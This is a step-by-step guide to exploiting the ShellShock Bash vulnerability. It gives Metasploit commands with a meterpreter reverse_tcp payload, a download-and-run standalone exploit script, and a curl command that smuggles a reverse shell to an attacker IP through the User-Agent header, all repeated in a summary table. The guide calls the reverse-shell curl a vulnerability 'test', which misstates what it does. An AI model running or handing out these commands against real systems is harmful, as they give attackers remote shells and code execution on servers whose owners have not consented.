The ShellShock vulnerability (CVE-2014-6271) affects the Bash shell, allowing attackers to execute arbitrary commands via specially crafted environment variables. Hereâ€™s a guide to using ShellShock exploit tools, including options and examples.

### **ShellShock Exploit (CVE-2014-6271)**

#### **Using Metasploit Framework for ShellShock**

1. **Search for ShellShock Exploit:**
   - **Description:** Search for the ShellShock exploit module in Metasploit.
   - **Command:**
     ```bash
     search shellshock
     ```
   - **Example:**
     ```bash
     search shellshock
     ```

   - **Explanation:** 
     - Lists available modules related to ShellShock.

2. **Use ShellShock Exploit Module:**
   - **Description:** Select the ShellShock exploit module.
   - **Command:**
     ```bash
     use exploit/multi/http/shellshock
     ```
   - **Example:**
     ```bash
     use exploit/multi/http/shellshock
     ```

   - **Explanation:** 
     - Chooses the ShellShock exploit module for HTTP services.

3. **Show Module Options:**
   - **Description:** Display the options for the ShellShock exploit module.
   - **Command:**
     ```bash
     show options
     ```
   - **Example:**
     ```bash
     show options
     ```

   - **Explanation:** 
     - Lists configuration options required for the exploit.

4. **Set Exploit Options:**
   - **Description:** Configure the required options for the exploit.
   - **Command:**
     ```bash
     set RHOSTS <target_ip>
     set TARGETURI <target_uri>
     set PAYLOAD <payload>
     ```
   - **Example:**
     ```bash
     set RHOSTS 192.168.1.100
     set TARGETURI /cgi-bin/test.cgi
     set PAYLOAD php/meterpreter/reverse_tcp
     ```

   - **Explanation:** 
     - Sets the target IP address, target URI, and payload type.

5. **Run the Exploit:**
   - **Description:** Execute the ShellShock exploit.
   - **Command:**
     ```bash
     run
     ```
   - **Example:**
     ```bash
     run
     ```

   - **Explanation:** 
     - Runs the configured exploit against the target.

#### **Using Standalone ShellShock Exploits**

For standalone ShellShock exploits, you might use various public tools or scripts. These tools are generally used as follows:

1. **Download the Exploit:**
   - **Description:** Obtain a ShellShock exploit script.
   - **Command:**
     ```bash
     wget https://example.com/shellshock_exploit.py
     ```
   - **Example:**
     ```bash
     wget https://github.com/yourrepo/shellshock_exploit.py
     ```

   - **Explanation:** 
     - Downloads the exploit script from a source repository.

2. **Run the Exploit Script:**
   - **Description:** Execute the ShellShock exploit script.
   - **Command:**
     ```bash
     python shellshock_exploit.py -u <target_url> -p <payload>
     ```
   - **Example:**
     ```bash
     python shellshock_exploit.py -u http://192.168.1.100/cgi-bin/test.cgi -p "id"
     ```

   - **Explanation:** 
     - Runs the exploit against the target URL with the specified payload.

3. **Test a Vulnerable Server:**
   - **Description:** Check if a server is vulnerable to ShellShock.
   - **Command:**
     ```bash
     curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1" <target_url>
     ```
   - **Example:**
     ```bash
     curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.10/4444 0>&1" http://192.168.1.100/cgi-bin/test.cgi
     ```

   - **Explanation:** 
     - Sends a crafted User-Agent header to test for the ShellShock vulnerability.

#### **Summary of ShellShock Commands**

| **Tool**                 | **Command**                                           | **Description**                                | **Example**                                      |
|--------------------------|-------------------------------------------------------|------------------------------------------------|--------------------------------------------------|
| **Metasploit (Exploit)** | `search shellshock`                                  | Search for ShellShock exploit module.         | `search shellshock`                              |
|                          | `use exploit/multi/http/shellshock`                   | Use ShellShock exploit module.                | `use exploit/multi/http/shellshock`              |
|                          | `show options`                                       | Show options for the exploit.                 | `show options`                                   |
|                          | `set RHOSTS <target_ip>`                             | Set target IP address.                        | `set RHOSTS 192.168.1.100`                       |
|                          | `set TARGETURI <target_uri>`                         | Set target URI.                               | `set TARGETURI /cgi-bin/test.cgi`                |
|                          | `set PAYLOAD <payload>`                              | Set payload type.                             | `set PAYLOAD php/meterpreter/reverse_tcp`        |
|                          | `run`                                                | Execute the exploit.                          | `run`                                            |
| **Standalone Exploit**   | `wget https://example.com/shellshock_exploit.py`      | Download the ShellShock exploit script.       | `wget https://github.com/yourrepo/shellshock_exploit.py` |
|                          | `python shellshock_exploit.py -u <target_url> -p <payload>` | Run the ShellShock exploit script.            | `python shellshock_exploit.py -u http://192.168.1.100/cgi-bin/test.cgi -p "id"` |
|                          | `curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1" <target_url>` | Test a server for ShellShock vulnerability.   | `curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.10/4444 0>&1" http://192.168.1.100/cgi-bin/test.cgi` |

---

The ShellShock vulnerability requires careful testing and remediation. Using Metasploit or standalone scripts can help identify and exploit this vulnerability to assess the security of affected systems.

